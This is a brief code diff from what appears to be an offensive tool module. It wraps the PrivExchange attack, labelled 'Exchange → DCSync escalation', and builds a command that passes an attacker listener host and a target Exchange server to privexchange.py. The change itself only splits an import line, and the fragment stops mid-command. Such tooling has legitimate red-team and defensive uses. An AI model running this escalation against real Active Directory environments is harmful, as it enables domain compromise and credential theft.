@@ -22,7 +22,8 @@ def run(args: Any) -> int:
     print("[*] PrivExchange: Exchange → DCSync escalation")
     print("[*] Exchange: {}  Listener: {}".format(target, listener or "ATTACKER"))
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     privexchange = shutil.which("privexchange.py") or shutil.which("privexchange")
     if privexchange:
         cmd = [privexchange, "-ah", listener or "", target or "",
